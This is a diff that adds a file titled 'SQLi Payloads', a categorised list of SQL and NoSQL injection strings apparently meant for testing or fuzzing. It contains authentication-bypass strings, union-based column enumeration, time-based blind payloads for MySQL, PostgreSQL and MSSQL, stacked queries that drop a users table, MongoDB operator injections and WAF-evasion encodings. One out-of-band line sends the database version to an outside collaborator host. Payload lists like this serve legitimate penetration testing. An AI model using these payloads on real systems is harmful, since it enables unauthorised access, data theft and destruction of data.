@@ -1,0 +1,95 @@
+# SQLi Payloads
+# Categories: Error-based, Union, Boolean, Time-based, NoSQL, WAF Bypass
+
+# === Error-Based ===
+'
+"
+%27
+%22
+\
+OR 1=1
+OR 1=1--
+OR '1'='1'
+OR "1"="1"
+' OR 1=1 --
+" OR 1=1 --
+admin'--
+admin' #
+' OR 1=1#
+' OR 1=1--
+
+# === Union-Based (column enumeration) ===
+' UNION SELECT 1 --
+' UNION SELECT 1,2 --
+' UNION SELECT 1,2,3 --
+' UNION SELECT 1,2,3,4 --
+' UNION SELECT NULL --
+' UNION SELECT NULL,NULL --
+' UNION SELECT NULL,NULL,NULL --
+' UNION ALL SELECT 1,2,3 --
+' UNION SELECT 1,2,3#
+
+# === Boolean-Based ===
+' AND 1=1 --
+' AND 1=2 --
+' OR 1=1 --
+' OR 1=2 --
+' AND '1'='1
+' AND '1'='2
+%27%20AND%201%3D1%20--
+%27%20AND%201%3D2%20--
+
+# === Time-Based (MySQL) ===
+' AND SLEEP(5) --
+' AND SLEEP(10) --
+' OR SLEEP(5) --
+' OR SLEEP(10) --
+' AND BENCHMARK(5000000,MD5(1)) --
+' OR BENCHMARK(5000000,MD5(1)) --
+
+# === Time-Based (PostgreSQL) ===
+' AND PG_SLEEP(5) --
+' OR PG_SLEEP(5) --
+' AND (SELECT * FROM PG_SLEEP(5)) --
+
+# === Time-Based (MSSQL) ===
+' WAITFOR DELAY '0:0:5' --
+' OR WAITFOR DELAY '0:0:5' --
+' AND WAITFOR DELAY '0:0:5' --
+
+# === Out of Band (OOB) (MySQL) ===
+' LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.burpcollaborator.net\\test')) --
+
+# === Stacked Queries ===
+' DROP TABLE users --
+'; DROP TABLE users; --
+'; SELECT * FROM admin; --
+
+# === Authentication Bypass ===
+admin' --
+admin' #
+admin'/*
+' OR 1=1 --
+' OR '1'='1'--
+' OR '1'='1'#
+admin' OR '1'='1
+admin" OR "1"="1
+
+# === NoSQL Injection (MongoDB) ===
+' || 1==1 //
+' || 1==1%00
+admin' || 1==1 //
+{"$gt": ""}
+{"$ne": ""}
+username[$ne]=admin&password[$ne]=test
+username[$regex]=.*&password[$regex]=.*
+
+# === WAF Bypass ===
+/*!50000OR*/ 1=1 --
+ANd 1=1 --
+OR 1=1 --
+UNION/**/SELECT/**/1,2,3 --
+/**/OR/**/1=1 --
+%25%32%37 OR 1=1 --
+%c0%27 OR 1=1 --
+´ OR 1=1 --
